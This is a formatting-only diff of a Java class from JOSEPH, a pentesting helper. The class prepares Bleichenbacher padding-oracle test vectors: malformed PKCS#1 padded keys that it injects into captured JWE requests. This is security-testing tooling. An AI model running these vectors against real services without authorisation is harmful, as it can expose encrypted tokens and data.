@@ -1,17 +1,17 @@
 /**
  * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
  * Copyright (C) 2016 Dennis Detering
- *
+ * <p>
  * This program is free software; you can redistribute it and/or modify it under
  * the terms of the GNU General Public License as published by the Free Software
  * Foundation; either version 2 of the License, or (at your option) any later
  * version.
- *
+ * <p>
  * This program is distributed in the hope that it will be useful, but WITHOUT
  * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
  * details.
- *
+ * <p>
  * You should have received a copy of the GNU General Public License along with
  * this program; if not, write to the Free Software Foundation, Inc., 51
  * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
@@ -128,7 +128,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         String publicKeyValue = publicKey.getText();
 
         // Throw error if public key value is empty
-        if(publicKeyValue.isEmpty()) {
+        if (publicKeyValue.isEmpty()) {
             throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
         }
 
@@ -143,7 +143,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
                 try {
                     Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);
                     List<PublicKey> publicKeys = Converter.getRsaPublicKeysByJwk(publickKeyValueJson);
-                    pubKey = (RSAPublicKey)publicKeys.get(0);
+                    pubKey = (RSAPublicKey) publicKeys.get(0);
 
                 } catch (Exception e) {
                     loggerInstance.log(getClass(), "Error on transforming to RSAPublicKey:  " + e.getMessage(), Logger.LogLevel.ERROR);
@@ -154,7 +154,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             // PEM (String)
             default:
                 pubKey = Converter.getRsaPublicKeyByPemString(publicKeyValue);
-                if(pubKey == null) {
+                if (pubKey == null) {
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                 }
         }
@@ -164,12 +164,12 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         try {
             encryptedKeys = generatePkcs1Vectors(pubKey, 32);
 
-        } catch(Exception e) {
+        } catch (Exception e) {
             throw new AttackPreparationFailedException(e.getMessage());
         }
 
         // Prepare requests
-        for(Map.Entry<payloadType, byte[]> cek: encryptedKeys.entrySet()) {
+        for (Map.Entry<payloadType, byte[]> cek : encryptedKeys.entrySet()) {
             byte[] request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getJoseValue());
             components[1] = Decoder.base64UrlEncode(cek.getValue());
@@ -211,7 +211,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         // Create combobox and textarea to add public key (in different formats)
         JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
         publicKeySelection = new JComboBox<>();
-        DefaultComboBoxModel<String> publicKeySelectionListModel= new DefaultComboBoxModel<>();
+        DefaultComboBoxModel<String> publicKeySelectionListModel = new DefaultComboBoxModel<>();
         publicKey = new JTextArea(10, 50);
         publicKey.setLineWrap(true);
 
@@ -325,7 +325,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
      * @param symmetricKey symmetric key in bytes
      * @return The padded key
      */
-    private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey)  {
+    private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = new byte[rsaKeyLength];
         // fill all the bytes with non-zero values
         Arrays.fill(key, (byte) 42);
@@ -341,11 +341,11 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         return key;
     }
 
-    private static byte[] getEK_NoNullByte(int rsaKeyLength, byte[] symmetricKey)  {
+    private static byte[] getEK_NoNullByte(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
 
         for (int i = 3; i < key.length; i++) {
-            if (key[i] == 0x00)  {
+            if (key[i] == 0x00) {
                 key[i] = 0x01;
             }
         }
@@ -354,14 +354,14 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     private static byte[] getEK_WrongFirstByte(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[0] = 23;
         loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong first byte.", Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_WrongSecondByte(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[1] = 23;
         loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong second byte.", Logger.LogLevel.DEBUG);
         return key;
@@ -375,21 +375,21 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     private static byte[] getEK_NullByteInPadding(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[11] = 0x00;
         loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in padding.", Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_SymmetricKeyOfSize40(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[rsaKeyLength - 40 - 1] = 0x00;
         loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 40.", Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_SymmetricKeyOfSize32(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
 
         for (int i = 3; i < key.length; i++) {
             if (key[i] == 0x00) {
@@ -402,7 +402,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     private static byte[] getEK_SymmetricKeyOfSize24(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
 
         for (int i = 3; i < key.length; i++) {
             if (key[i] == 0x00) {
@@ -415,7 +415,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     private static byte[] getEK_SymmetricKeyOfSize16(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
 
         for (int i = 3; i < key.length; i++) {
             if (key[i] == 0x00) {
@@ -428,9 +428,9 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     private static byte[] getEK_SymmetricKeyOfSize8(int rsaKeyLength, byte[] symmetricKey) {
-        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
+        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
 
-        for ( int i = 3; i < key.length; i++ ) {
+        for (int i = 3; i < key.length; i++) {
             if (key[i] == 0x00) {
                 key[i] = 0x01;
             }
